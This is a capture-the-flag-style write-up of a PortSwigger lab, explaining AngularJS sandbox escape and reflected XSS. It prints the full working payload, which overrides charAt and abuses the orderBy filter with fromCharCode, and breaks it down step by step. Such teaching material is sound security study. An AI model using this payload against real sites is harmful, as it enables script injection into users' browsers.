---
title: "PortSwigger Expert Lab: AngularJS Sandbox Escape XSS"
published: 2026-03-12
description: "A simple walkthrough of solving PortSwigger's reflected XSS with AngularJS sandbox escape without strings."
tags: ["web", "xss", "angularjs", "portswigger", "writeup"]
category: "CTFs"
draft: false
---

# Introduction

This lab looked scary at first because it involved **AngularJS sandbox escape**, and even worse, it said **without strings**.   
<p align="center">
<img src="/src/assets/images/xss_lab1_meme.jpg" width="400">
</p>

So before solving the lab, I first tried to understand two things:

1. what the **AngularJS sandbox** is  
2. why it was later removed and not trusted as a real security feature

Once I understood that, the exploit started making much more sense.

# What is AngularJS sandbox?

AngularJS expressions were made to let developers write small bits of logic inside HTML templates.

For example:

```html
{{ 1 + 1 }}
```
This prints:
```
2
```
To stop expressions from doing dangerous things, AngularJS used something called a sandbox.
The sandbox tried to block access to risky JavaScript features like constructors and other dangerous properties.
The idea was simple: keep expressions small and harmless.

But the problem was that this sandbox was never truly strong. People kept finding clever ways to escape it.

That is why AngularJS eventually stopped treating it as a real security boundary.

In simple words:

the sandbox looked safe, but it was not strong enough

Understanding the code used in the lab

The lab includes this code:
```
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'abc';
    $scope.value = $parse(key)($scope.query);
});
```
At first this looks confusing, but it becomes simple if we break it apart.

Step 1: A module and controller are created
```
angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {
```
This creates an AngularJS app called labApp and a controller called vulnCtrl.

It uses:

$scope to store data for the page

$parse to read a string and treat it like an AngularJS expression

Step 2: An empty object is created
```$scope.query = {};```

This means query starts as an empty object.

Step 3: A variable called key is set
```var key = 'search';```

So now key contains "search".

Step 4: A property is added
```$scope.query[key] = 'abc';```

Since key is "search", this becomes:

```$scope.query["search"] = "abc";```

So now the object looks like this:
{
  search: "abc"
}
Step 5: $parse is used

```$scope.value = $parse(key)($scope.query);```

Because key is "search", this becomes:

```$parse("search")($scope.query)```

AngularJS reads the string "search" as an expression and looks it up inside $scope.query.

So it returns:

"abc"

That means $scope.value becomes "abc".

Why this matters

Normally this looks harmless.

But the danger is that AngularJS is evaluating expressions, and if user input is reflected into that context, an attacker may be able to turn it into something dangerous.

That is the idea behind this lab.

The payload

This is the working payload:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
Breaking the payload into simple parts
```
The important injected part is:
```
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
It looks messy, but each part has a job.

Step 1: toString() helps create a string-like value
toString()

The lab makes normal string usage difficult, so this trick helps us work with strings without writing them in the usual way.

Step 2: Reach the String constructor
```
toString().constructor
```
This gives access to the constructor of the string object, which is very useful in sandbox escape tricks.

Step 3: Overwrite charAt ```
toString().constructor.prototype.charAt=[].join
```
This changes how charAt behaves for strings.

Normally:

"abc".charAt(0)

returns:

a

But after overwriting it, AngularJS no longer gets the normal behavior it expects.

This breaks part of the sandbox logic.

In simple words:

we are changing string behavior so AngularJS makes a bad security decision

Step 4: Use the orderBy filter
[1] | orderBy: ...

The array is passed into the orderBy filter, and the filter argument becomes the place where the payload is processed.

Step 5: Build x=alert(1) using character codes
```
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```
This creates a string from character codes.

It becomes:
```
x=alert(1)
```
This helps avoid writing the payload directly as a normal quoted string.